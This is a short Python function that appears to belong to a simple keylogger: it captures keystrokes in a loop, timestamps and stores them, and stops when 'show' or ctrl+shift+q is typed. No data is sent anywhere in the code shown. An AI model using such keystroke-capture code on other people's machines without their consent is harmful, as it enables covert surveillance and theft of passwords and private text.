import process_keys
import listener
def listen_and_stor_keys():
    keystrokes = {}
    checker = ["","","",""]
    while True:
        char = listener.listen_keys()
        if char:
            char_with_date = process_keys.date_key(char)
            process_keys.storing_keystrokes_by_time(char_with_date,keystrokes)
            checker.append(char)
            checker.pop(0)
            if checker == ["s", "h", "o", "w"] or checker[1:] == ["ctrl" , "shift", "q"]:
                break
        else:
            continue
    return (keystrokes, checker[1:])